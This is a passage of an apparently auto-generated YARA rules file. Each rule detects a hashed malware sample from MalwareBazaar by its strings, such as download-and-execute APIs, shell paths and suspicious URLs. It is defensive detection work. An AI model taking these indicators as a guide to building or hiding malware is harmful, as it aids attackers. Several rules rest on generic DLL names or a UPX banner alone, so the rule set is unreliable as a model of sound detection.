        filesize < 679KB and
        all of them
}

rule Windows_f58ad4337612da61eb8872c59cf8c5a7c6ccbc36872284ff69ba053809d4195d
{
    meta:
        description = "Auto ML: f58ad4337612da61eb8872c59cf8c5a7c6ccbc36872284ff69ba053809d4195d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "get_Simple_Coffee_Cup_Logo_Template_Download_on_Pngtree"
        $s2 = "get_RowTemplate"
        $s3 = "UnsafeValueTypeAttribute"
        $s4 = "kernel32.dll"
        $s5 = "System.Runtime.ConstrainedExecution"
        $s6 = "set_PasswordChar"
        $s7 = "ExecuteScalar"
        $s8 = "System.Security.Cryptography"
        $s9 = "ExecuteNonQuery"
        $s10 = "17.0.0.0"
        $s11 = "17.7.0.0"
        $s12 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s13 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj"
        $s14 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s15 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPr`"
        $s16 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPw`"
        $s17 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s18 = "mscoree.dll"
        $s19 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>"
        $s20 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 999KB and
        all of them
}

rule Windows_eb90ab3c6321cbe8ec6763de4b880277b4120b739c8b88ebedea51cd0e097107
{
    meta:
        description = "Auto ML: eb90ab3c6321cbe8ec6763de4b880277b4120b739c8b88ebedea51cd0e097107"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@Madexcept@DecryptPassword$qqr27System@%AnsiStringT$us$i0$%t1t1"
        $s2 = "@Madexcept@HttpUpload$qqr27System@%AnsiStringT$us$i0$%52System@%DelphiInterface$t24Madexcept@IMEAttachments%47System@%DelphiInterface$t19Madexcept@IMEFields%t1t1uit1uioo49System@%DelphiInterface$t21Madexcept@IMESettings%"
        $s3 = "@Madexcept@HttpUploadTimeout"
        $s4 = "@Madexcept@ISAPIApp_TISAPIApplication_ISAPIHandleException"
        $s5 = "@Madexcept@SendMapiMail$qqr27System@%AnsiStringT$us$i0$%t1t152System@%DelphiInterface$t24Madexcept@IMEAttachments%uioo49System@%DelphiInterface$t21Madexcept@IMESettings%"
        $s6 = "@Madexcept@SendShellMail$qqr27System@%AnsiStringT$us$i0$%t1t1"
        $s7 = "kernel32.dll"
        $s8 = "user32.dll"
        $s9 = "gdi32.dll"
        $s10 = "advapi32.dll"
        $s11 = "comctl32.dll"
        $s12 = "comdlg32.dll"
        $s13 = "shell32.dll"
        $s14 = "wsock32.dll"
        $s15 = "ShellExecuteExA"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 156KB and
        all of them
}

rule Windows_952ed9e258ca3af11547c77a5949b36c3497f75177c1d9a819516ef6c923fa9e
{
    meta:
        description = "Auto ML: 952ed9e258ca3af11547c77a5949b36c3497f75177c1d9a819516ef6c923fa9e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Christmas.exe"
        $s2 = "kernel32.dll"
        $s3 = "get_MetadataToken"
        $s4 = "RSACryptoServiceProvider"
        $s5 = "System.Security.Cryptography"
        $s6 = "AesCryptoServiceProvider"
        $s7 = "MD5CryptoServiceProvider"
        $s8 = "CryptoConfig"
        $s9 = "ICryptoTransform"
        $s10 = "CryptoStream"
        $s11 = "CryptoStreamMode"
        $s12 = "CreateDecryptor"
        $s13 = "GetPublicKeyToken"
        $s14 = "CreateEncryptor"
        $s15 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s16 = "1.0.0.0"
        $s17 = "GAnu5USi9xKM94VWG8.qTIQLZnWZXXoYVU5us+yc0c8Jyh6Qact0xNAkh+fBArHgyRiR44uQt5GIQ`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]"
        $s18 = "SUsSystem.Runtime.InteropServices.CharSet, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s19 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s20 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 393KB and
        all of them
}

rule Windows_c6cf82919b809967d9d90ea73772a8aa1c1eb3bc59252d977500f64f1a0d6731
{
    meta:
        description = "Auto ML: c6cf82919b809967d9d90ea73772a8aa1c1eb3bc59252d977500f64f1a0d6731"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "l32.dll"
        $s2 = "advapi32H"
        $s3 = "i32.dll"
        $s4 = "_32.dll"
        $s5 = "rof.dll"
        $s6 = "Chmod"
        $s7 = "chmod"
        $s8 = "Delete"
        $s9 = "ExecIO"
        $s10 = "Fchmod"
        $s11 = "delete"
        $s12 = "HasSHA1"
        $s13 = "HasSHA2"
        $s14 = "HasSHA3"
        $s15 = "MapIndex"
        $s16 = "HasSHA512"
        $s17 = "Temporary"
        $s18 = "iox/crypto"
        $s19 = "MaxSockets"
        $s20 = "SocketType"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2340KB and
        all of them
}

rule Windows_28959e7e51065d5f870bd023962d48829b51cdfa044b1bd822651dbe2e9f4f3c
{
    meta:
        description = "Auto ML: 28959e7e51065d5f870bd023962d48829b51cdfa044b1bd822651dbe2e9f4f3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "s:IDS_EXTRFILESTOTEMP"
        $s2 = "s:IDS_WRONGPASSWORD"
        $s3 = "s:IDS_WRONGFILEPASSWORD"
        $s4 = "$GETPASSWORD1:SIZE"
        $s5 = "$GETPASSWORD1:CAPTION"
        $s6 = "$GETPASSWORD1:IDC_PASSWORDENTER"
        $s7 = "$GETPASSWORD1:IDOK"
        $s8 = "$GETPASSWORD1:IDCANCEL"
        $s9 = "USER32.dll"
        $s10 = "GDI32.dll"
        $s11 = "ADVAPI32.dll"
        $s12 = "SHELL32.dll"
        $s13 = "ole32.dll"
        $s14 = "SHLWAPI.dll"
        $s15 = "COMCTL32.dll"
        $s16 = " delete"
        $s17 = " delete[]"
        $s18 = "`placement delete closure'"
        $s19 = "`placement delete[] closure'"
        $s20 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxzip32\\Release\\sfxzip.pdb"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3135KB and
        all of them
}

rule Linux_31c5ffca4eb495f9f3673e1a3a2a6373e872d6b825de70012794330f12190abf
{
    meta:
        description = "Auto ML: 31c5ffca4eb495f9f3673e1a3a2a6373e872d6b825de70012794330f12190abf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "URL>b/bd"
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB and
        all of them
}

rule Linux_6c8df72c33f5e8854254c7835d8fef59cf40dec522fd29cbb4d13cd72bd2b42b
{
    meta:
        description = "Auto ML: 6c8df72c33f5e8854254c7835d8fef59cf40dec522fd29cbb4d13cd72bd2b42b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB and
        all of them
}

rule Linux_f4d1273f3ca99910603f01559cc2491ff37738bb6b6b21034ea856db14a09b90
{
    meta:
        description = "Auto ML: f4d1273f3ca99910603f01559cc2491ff37738bb6b6b21034ea856db14a09b90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Windows_a8e53467c74885365a058ed7db191d50284b3e983c65bc69287927763d4301a3
{
    meta:
        description = "Auto ML: a8e53467c74885365a058ed7db191d50284b3e983c65bc69287927763d4301a3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "An application has made an attempt to load the C runtime library incorrectly."
        $s2 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s3 = "- Attempt to initialize the CRT more than once."
        $s4 = "USER32.DLL"
        $s5 = "WS2_32.dll"
        $s6 = "ADVAPI32.dll"
        $s7 = "IMM32.dll"
        $s8 = "RPCRT4.dll"
        $s9 = "USER32.dll"
        $s10 = "CLUSAPI.dll"
        $s11 = "LZ32.dll"
        $s12 = "DeleteCriticalSection"
        $s13 = "KERNEL32.dll"
        $s14 = "OLEAUT32.dll"
        $s15 = "SETUPAPI.dll"
        $s16 = "ole32.dll"
        $s17 = "snotnoin69.dll"
        $s18 = "')#Q%C:\\"
        $s19 = "Qlapi"
        $s20 = "MpaPi'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2568KB and
        all of them
}

rule Windows_e675f1c52fdbe655e968f9c600760a3ac492c1193ed963b914d02954b21105fe
{
    meta:
        description = "Auto ML: e675f1c52fdbe655e968f9c600760a3ac492c1193ed963b914d02954b21105fe"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Scarfsobtent.exe"
        $s2 = "DeleteValueSetOffset"
        $s3 = "AccessTokenTryGetBuffer"
        $s4 = "InvalidOperationEnumNotStartedRegistryValueOptions"
        $s5 = "ReflectionEmitSecurityRegistryPermission"
        $s6 = "setAceFlagsSoapToken"
        $s7 = "MessageEndRegistry"
        $s8 = "ValueTupleSupportUrl"
        $s9 = "SignatureTokenCreateTypeInfo"
        $s10 = "ISoapXsdEnsureSufficientExecutionStack"
        $s11 = "getBlockSizeValueOffsetLow"
        $s12 = "UnmanagedMemoryStreamWrappergetExecutionContext"
        $s13 = "getAbbreviatedMonthNamesGetFieldToken"
        $s14 = "PropSetCryptoKeyAccessRule"
        $s15 = "SafeProcessHandleSafeLsaReturnBufferHandle"
        $s16 = "getMillisecondsMethodToken"
        $s17 = "PhiMethodToken"
        $s18 = "RequestedExecutionLevelGetTypeLibGuidForAssembly"
        $s19 = "ADAsyncWorkItemRegistryOptions"
        $s20 = "CRYPTOIDINFOGetAsyncBeginInfo"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3990KB and
        all of them
}

rule Windows_1a44d692a3fb7e739b023883b213f6d84ab72fb0ddb9dc62d928edcc25acdaba
{
    meta:
        description = "Auto ML: 1a44d692a3fb7e739b023883b213f6d84ab72fb0ddb9dc62d928edcc25acdaba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.DLL"
        $s2 = "COMCTL32.dll"
        $s3 = "GDI32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "SkinH_EL.dll"
        $s9 = "C:\\Windows\\jedata.dll"
        $s10 = "_yC:\\Windows\\win8.she"
        $s11 = "ole32.dll"
        $s12 = "jedata.dll"
        $s13 = "http://user.qzone.qq.com/1040452597"
        $s14 = "CTempGdiObject"
        $s15 = "CTempDC"
        $s16 = "MS Shell Dlg"
        $s17 = "CTempWnd"
        $s18 = "COMCTL32.DLL"
        $s19 = "CTempImageList"
        $s20 = "CTempMenu"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 270KB and
        all of them
}

rule Windows_71cec4311fb8b5f2e7ce53d6f4a392837483536bef7642f0ba92d5d05cb210bd
{
    meta:
        description = "Auto ML: 71cec4311fb8b5f2e7ce53d6f4a392837483536bef7642f0ba92d5d05cb210bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "MSVBVM60.DLL"
        $s2 = "ModDownload"
        $s3 = "ModSrvcManagerAPI"
        $s4 = "advapi32.dll"
        $s5 = "RegDeleteKeyA"
        $s6 = "advapi32"
        $s7 = "userenv.dll"
        $s8 = "imagehlp.dll"
        $s9 = "urlmon"
        $s10 = "URLDownloadToFileA"
        $s11 = "ZDowFile.dll"
        $s12 = "AsyncDownloadFile"
        $s13 = "GetDownloadFinalStatus"
        $s14 = "shell32.dll"
        $s15 = "ShellExecuteEx"
        $s16 = "DeleteFileA"
        $s17 = "Kernel32.dll"
        $s18 = "PSAPI.DLL"
        $s19 = "VBA6.DLL"
        $s20 = "C:\\Windows\\SysWow64\\MSVBVM60.DLL\\3"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 232KB and
        all of them
}

rule Windows_8ca89afeeb38cda1dd2806fe18904a7fd62e6f368fc16d13199f42841a0cc300
{
    meta:
        description = "Auto ML: 8ca89afeeb38cda1dd2806fe18904a7fd62e6f368fc16d13199f42841a0cc300"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.DLL"
        $s2 = "COMCTL32.dll"
        $s3 = "GDI32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "SkinH_EL.dll"
        $s9 = "kernel32.dll"
        $s10 = "user32.dll"
        $s11 = "advapi32.dll"
        $s12 = "Shell Embedding"
        $s13 = "C:\\Windows\\system32"
        $s14 = "\\cwdsoft.dll"
        $s15 = "QA:\\r"
        $s16 = "VZR:\\y1"
        $s17 = "Obo:\\"
        $s18 = " Uj:\\"
        $s19 = "nSshB"
        $s20 = "tencent://message/?uin=1257251000&Site=ssc.cwdkj.com&Menu=yes"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5056KB and
        all of them
}

rule Windows_a7dda4615949be0869c3ca592b0e2eb8a598851266da3941d419114d70e1be20
{
    meta:
        description = "Auto ML: a7dda4615949be0869c3ca592b0e2eb8a598851266da3941d419114d70e1be20"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s2 = "kernel32.dll"
        $s3 = "oleaut32.dll"
        $s4 = "Hot Virtual Keyboard 8.1.2.0"
        $s5 = "OpenMPT 1.19.03.00  "
        $s6 = "w:\\IZw\\"
        $s7 = "Ms Shell Dlg 2"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 320KB and
        all of them
}

rule Windows_82bfaa07d548662efd85a71d121be0b067b6a78fb4c811bec2048a5826c2c716
{
    meta:
        description = "Auto ML: 82bfaa07d548662efd85a71d121be0b067b6a78fb4c811bec2048a5826c2c716"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "MSVBVM60.DLL"
        $s2 = "advapi32.dll"
        $s3 = "RegDeleteKeyA"
        $s4 = "advapi32"
        $s5 = "userenv.dll"
        $s6 = "imagehlp.dll"
        $s7 = "urlmon"
        $s8 = "URLDownloadToFileA"
        $s9 = "ZDowFile.dll"
        $s10 = "AsyncDownloadFile"
        $s11 = "GetDownloadFinalStatus"
        $s12 = "shell32.dll"
        $s13 = "ShellExecuteEx"
        $s14 = "DeleteFileA"
        $s15 = "Kernel32.dll"
        $s16 = "PSAPI.DLL"
        $s17 = "C:\\Windows\\SysWow64\\MSVBVM60.DLL\\3"
        $s18 = "Version.dll"
        $s19 = "DeleteFile"
        $s20 = "DeleteFolder"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 324KB and
        all of them
}

rule Windows_6bc44ffdf5fb9a208f27e836635852620368c30c5320163f3fcde1f9931091e7
{
    meta:
        description = "Auto ML: 6bc44ffdf5fb9a208f27e836635852620368c30c5320163f3fcde1f9931091e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "Causes Setup to create a log file in the user's TEMP directory."
        $s4 = "/DIR=\"x:\\dirname\""
        $s5 = "/PASSWORD=password"
        $s6 = "Specifies the password to use."
        $s7 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline"
        $s8 = "DeleteCriticalSection"
        $s9 = "user32.dll"
        $s10 = "oleaut32.dll"
        $s11 = "advapi32.dll"
        $s12 = "OpenProcessToken"
        $s13 = "LookupPrivilegeValueA"
        $s14 = "DeleteFileA"
        $s15 = "comctl32.dll"
        $s16 = "AdjustTokenPrivileges"
        $s17 = "    version=\"1.0.0.0\""
        $s18 = "            version=\"6.0.0.0\""
        $s19 = "            publicKeyToken=\"6595b64144ccf1df\""
        $s20 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 9243KB and
        all of them
}

rule Windows_5b66a22d1518a05674e6950d177f8b2dbe43f6b761a63df5f2f5cc066e196299
{
    meta:
        description = "Auto ML: 5b66a22d1518a05674e6950d177f8b2dbe43f6b761a63df5f2f5cc066e196299"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "KERNEL32.dll"
        $s3 = "U:\\u\\"
        $s4 = "+http://ts-crl.ws.symantec.com/tss-ca-g2.crl0"
        $s5 = "http://ts-ocsp.ws.symantec.com07"
        $s6 = "+http://ts-aia.ws.symantec.com/tss-ca-g2.cer0"
        $s7 = "http://ocsp.thawte.com0"
        $s8 = ".http://crl.thawte.com/ThawteTimestampingCA.crl0"
        $s9 = "Lhttp://pki-crl.symauth.com/ca_d409a5cb737dc0768fd08ed5256f3633/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "1.0.3.0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2834KB and
        all of them
}

rule Windows_cecd6300d3b206bfef3ce3d6bc4f658c930df6f9150e6ba78dc902c586868bb6
{
    meta:
        description = "Auto ML: cecd6300d3b206bfef3ce3d6bc4f658c930df6f9150e6ba78dc902c586868bb6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.DLL"
        $s2 = "COMCTL32.dll"
        $s3 = "GDI32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "SkinH_EL.dll"
        $s9 = "http://fzgg.guluzhu.com/"
        $s10 = "http://www.58moyu.cn/"
        $s11 = "explorer.exe"
        $s12 = "SHLWAPI"
        $s13 = "OpenProcessToken"
        $s14 = "LookupPrivilegeValueA"
        $s15 = "AdjustTokenPrivileges"
        $s16 = "ShellExecuteA"
        $s17 = "CTempGdiObject"
        $s18 = "CTempDC"
        $s19 = "MS Shell Dlg"
        $s20 = "CTempWnd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 315KB and
        all of them
}

rule Windows_049dbfebc95c1a295989816a9b35d6defaabcc3e41c5e7b6bd77aaa10f8b3c14
{
    meta:
        description = "Auto ML: 049dbfebc95c1a295989816a9b35d6defaabcc3e41c5e7b6bd77aaa10f8b3c14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "u$SShe"
        $s2 = "RICHED32.DLL"
        $s3 = "RICHED20.DLL"
        $s4 = "An application has made an attempt to load the C runtime library incorrectly."
        $s5 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s6 = "- Attempt to initialize the CRT more than once."
        $s7 = "USER32.DLL"
        $s8 = "`placement delete[] closure'"
        $s9 = "`placement delete closure'"
        $s10 = " delete[]"
        $s11 = " delete"
        $s12 = "OLEACC.dll"
        $s13 = "c:\\Perforce\\Odin3\\Release\\Odin3.pdb"
        $s14 = "DeleteCriticalSection"
        $s15 = "GlobalDeleteAtom"
        $s16 = "KERNEL32.dll"
        $s17 = "SystemParametersInfoA"
        $s18 = "IsRectEmpty"
        $s19 = "USER32.dll"
        $s20 = "DeleteObject"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 416KB and
        all of them
}

rule Windows_078252271f503938516b9fa95e20456414befdea22e6a5bdba7e2443574bb6e6
{
    meta:
        description = "Auto ML: 078252271f503938516b9fa95e20456414befdea22e6a5bdba7e2443574bb6e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>"
        $s2 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicKeyToken=\"1fc8b3b9a1e18e3b\"></assemblyIdentity>"
        $s3 = "d3d9.dll"
        $s4 = "d3dx9_42.dll"
        $s5 = "AVA.dll"
        $s6 = "USER32.dll"
        $s7 = "MSVCR90.dll"
        $s8 = "KERNEL32.dll"
        $s9 = "http://j13066429292.7958.com/down_12145499.html"
        $s10 = "Kernel32.dll"
        $s11 = "user32.dll"
        $s12 = "gdiplus.dll"
        $s13 = "kernel32.dll"
        $s14 = "gdi32.dll"
        $s15 = "msimg32.dll"
        $s16 = "comctl32.dll"
        $s17 = "COMCTL32.DLL"
        $s18 = "User32.dll"
        $s19 = "wininet.dll"
        $s20 = "ole32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1020KB and
        all of them
}

rule Windows_4abbab1431b24795301658946d26e5055fdfa7c4d274f53d8236c4214e3d3d8e
{
    meta:
        description = "Auto ML: 4abbab1431b24795301658946d26e5055fdfa7c4d274f53d8236c4214e3d3d8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "uxtheme.dll"
        $s3 = "userenv.dll"
        $s4 = "setupapi.dll"
        $s5 = "apphelp.dll"
        $s6 = "propsys.dll"
        $s7 = "dwmapi.dll"
        $s8 = "cryptbase.dll"
        $s9 = "oleacc.dll"
        $s10 = "version.dll"
        $s11 = "profapi.dll"
        $s12 = "comres.dll"
        $s13 = "clbcatq.dll"
        $s14 = "shell32.dll"
        $s15 = "Causes Setup to create a log file in the user's TEMP directory."
        $s16 = "/DIR=\"x:\\dirname\""
        $s17 = "/PASSWORD=password"
        $s18 = "Specifies the password to use."
        $s19 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcmdline"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 5694KB and
        all of them
}

rule Windows_b62a82b6e80e1aeac41958829ca5b03217be8cb4b574a8c47c5c3617fd3306b6
{
    meta:
        description = "Auto ML: b62a82b6e80e1aeac41958829ca5b03217be8cb4b574a8c47c5c3617fd3306b6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Equators.exe"
        $s2 = "CryptoHelper"
        $s3 = "CryptoException"
        $s4 = "DownloadAndExecuteUpdate"
        $s5 = "DownloadUpdate"
        $s6 = "Dwmapi"
        $s7 = "Shlwapi"
        $s8 = "System.Security.Cryptography"
        $s9 = "MD5CryptoServiceProvider"
        $s10 = "AddressHeader"
        $s11 = "set_CertificateValidationMode"
        $s12 = "X509CertificateValidationMode"
        $s13 = "Delete"
        $s14 = "GetExecutingAssembly"
        $s15 = "GetTokens"
        $s16 = "RegistryKey"
        $s17 = "Registry"
        $s18 = "DownloadFile"
        $s19 = "DownloadData"
        $s20 = "get_ServerCertificateValidationCallback"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB and
        all of them
}

rule Windows_e840d96297d0a1260965678819666722e37401b84676656a8c6213b42d26dd9f
{
    meta:
        description = "Auto ML: e840d96297d0a1260965678819666722e37401b84676656a8c6213b42d26dd9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " attempts."
        $s2 = " attempts. The correct number was "
        $s3 = "executable format error"
        $s4 = "not a socket"
        $s5 = " delete"
        $s6 = " delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "AreFileApisANSI"
        $s10 = "DeleteCriticalSection"
        $s11 = "KERNEL32.dll"
        $s12 = "GetProcessHeap"
        $s13 = ".?AU_Crt_new_delete@std@@"
        $s14 = "9T:\\:d:l:t:|:"
        $s15 = "C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe"
        $s16 = "api-ms-win-core-synch-l1-2-0.dll"
        $s17 = "kernel32.dll"
        $s18 = "Bapi-ms-win-core-fibers-l1-1-1"
        $s19 = "api-ms-win-core-synch-l1-2-0"
        $s20 = "api-ms-"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 600KB and
        all of them
}

rule Linux_256aac8f53ba7a5f04d646c933a6653aa3da5fd5449020580d41b2406dbe0cef
{
    meta:
        description = "Auto ML: 256aac8f53ba7a5f04d646c933a6653aa3da5fd5449020580d41b2406dbe0cef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "/usr/libexec/openssh/sftp-server"
        $s4 = "shell"
        $s5 = "/usr/bin/shutdown"
        $s6 = "Exec format error"
        $s7 = "Resource temporarily unavailable"
        $s8 = "Multihop attempted"
        $s9 = "Attempting to link in too many shared libraries"
        $s10 = "Cannot exec a shared library directly"
        $s11 = "Socket operation on non-socket"
        $s12 = "Protocol wrong type for socket"
        $s13 = "Socket type not supported"
        $s14 = "/bin/sh"
        $s15 = "__get_myaddress: socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 131KB and
        all of them
}

rule Linux_d6518412256e7ffcf1533b6bc283e9de7d1f2bc8b7b6839d06fd0c76ea5e74b7
{
    meta:
        description = "Auto ML: d6518412256e7ffcf1533b6bc283e9de7d1f2bc8b7b6839d06fd0c76ea5e74b7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "/usr/libexec/openssh/sftp-server"
        $s4 = "shell"
        $s5 = "/usr/bin/shutdown"
        $s6 = "Exec format error"
        $s7 = "Resource temporarily unavailable"
        $s8 = "Multihop attempted"
        $s9 = "Attempting to link in too many shared libraries"
        $s10 = "Cannot exec a shared library directly"
        $s11 = "Socket operation on non-socket"
        $s12 = "Protocol wrong type for socket"
        $s13 = "Socket type not supported"
        $s14 = "/sys/devices/system/cpu"
        $s15 = "_Unwind_DeleteException"
        $s16 = "__gnu_unwind_execute"
        $s17 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm"
        $s18 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc"
